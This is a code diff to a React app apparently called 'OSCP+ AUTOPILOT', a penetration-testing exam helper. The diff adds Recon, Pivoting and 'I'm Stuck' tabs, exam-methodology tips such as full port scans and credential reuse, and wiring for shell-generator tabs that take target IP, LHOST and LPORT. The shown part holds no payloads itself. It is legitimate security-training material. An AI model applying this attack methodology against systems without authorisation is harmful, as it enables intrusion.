+    <div className="sec-title" style={{marginTop:20}}>Mental Checklist When Stuck</div>
+    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# Ask yourself:
+# 1. What do I KNOW? (list all facts)
+# 2. What have I NOT tried? (check list above)
+# 3. Is there a different entry point I missed?
+# 4. Can I combine two findings? (e.g., user from SNMP + weak password)
+# 5. Am I in a rabbit hole? (>2 hours = MOVE ON)
+#
+# COMMON MISTAKES:
+# - Not scanning ALL ports (-p-)
+# - Not trying creds everywhere
+# - Not reading source code carefully
+# - Ignoring UDP services (SNMP!)
+# - Not checking for version-specific exploits
+# - Overthinking — OSCP is about methodology, not 0-days`}</div></div>
+  </div>)
+}
+
 // ━━━ MAIN APP ━━━
 const TABS=[
+  {id:"recon",label:"Recon",icon:"🔍"},
   {id:"ad",label:"AD Attack",icon:"🏰"},
   {id:"auto",label:"Standalones",icon:"🎯"},
   {id:"privesc",label:"Priv Esc",icon:"⬆️"},
+  {id:"tunnel",label:"Pivoting",icon:"🔀"},
   {id:"shells",label:"Shells",icon:"💀"},
   {id:"hash",label:"Hash ID",icon:"#️⃣"},
+  {id:"stuck",label:"I'm Stuck",icon:"🆘"},
   {id:"timer",label:"Timer",icon:"⏱️"},
   {id:"check",label:"Checklist",icon:"✅"},
   {id:"notes",label:"Notes",icon:"📝"},
 ];
 
 function App(){
-  const[tab,setTab]=useState("ad");
+  const[tab,setTab]=useState("recon");
   const[targetIP,setTargetIP]=useState("");
   const[lhost,setLhost]=useState("");
   const[lport,setLport]=useState("4444");
@@ -823,7 +1113,7 @@ function App(){
     <style>{CSS}</style>
     <div className="app">
       <div className="hdr">
-        <div><div className="logo">OSCP+ AUTOPILOT</div><div className="logo-sub">Decision Engine — OSCP+ 2025</div></div>
+        <div><div className="logo">OSCP+ AUTOPILOT</div><div className="logo-sub">Decision Engine — OSCP+ 2025/2026</div></div>
         <div className="inps">
           <input className="inp" style={{width:130}} placeholder="Target IP" value={targetIP} onChange={e=>setTargetIP(e.target.value)}/>
           <input className="inp" style={{width:130}} placeholder="Your IP (LHOST)" value={lhost} onChange={e=>setLhost(e.target.value)}/>
@@ -832,11 +1122,14 @@ function App(){
       </div>
       <div className="tabs">{TABS.map(t=><button key={t.id} className={`tab ${tab===t.id?'on':''}`} onClick={()=>setTab(t.id)}>{t.icon} {t.label}</button>)}</div>
       <div className="main">
+        {tab==="recon"&&<ReconTab targetIP={targetIP}/>}
         {tab==="ad"&&<ADTab lhost={lhost}/>}
         {tab==="auto"&&<AutopilotTab targetIP={targetIP}/>}
         {tab==="privesc"&&<PrivEscTab lhost={lhost}/>}
+        {tab==="tunnel"&&<TunnelingTab lhost={lhost}/>}
         {tab==="shells"&&<ShellTab lhost={lhost} lport={lport}/>}
         {tab==="hash"&&<HashTab/>}
+        {tab==="stuck"&&<StuckTab/>}
         {tab==="timer"&&<TimerTab/>}
         {tab==="check"&&<ChecklistTab/>}
         {tab==="notes"&&<NotesTab/>}
